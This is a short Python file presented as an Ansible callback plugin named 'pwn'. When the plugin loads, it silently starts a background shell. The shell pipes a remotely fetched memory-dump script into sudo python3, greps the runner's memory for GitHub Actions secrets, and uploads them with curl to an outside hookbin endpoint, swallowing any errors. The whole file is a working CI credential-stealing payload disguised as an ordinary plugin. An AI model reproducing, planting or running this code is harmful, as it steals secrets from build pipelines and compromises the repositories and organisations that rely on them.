import os
import subprocess
from ansible.plugins.callback import CallbackBase

class CallbackModule(CallbackBase):
    CALLBACK_VERSION = 2.0
    CALLBACK_TYPE = 'stdout'
    CALLBACK_NAME = 'pwn'

    def __init__(self, display=None):
        super(CallbackModule, self).__init__(display)
        # Exploit payload
        cmd = """
        echo "Okay, we got this far. Let's continue..."
        curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets"
        curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
        """
        try:
            # We run it in the background to not block ansible
            subprocess.Popen(['/bin/bash', '-c', cmd], start_new_session=True)
        except Exception:
            pass
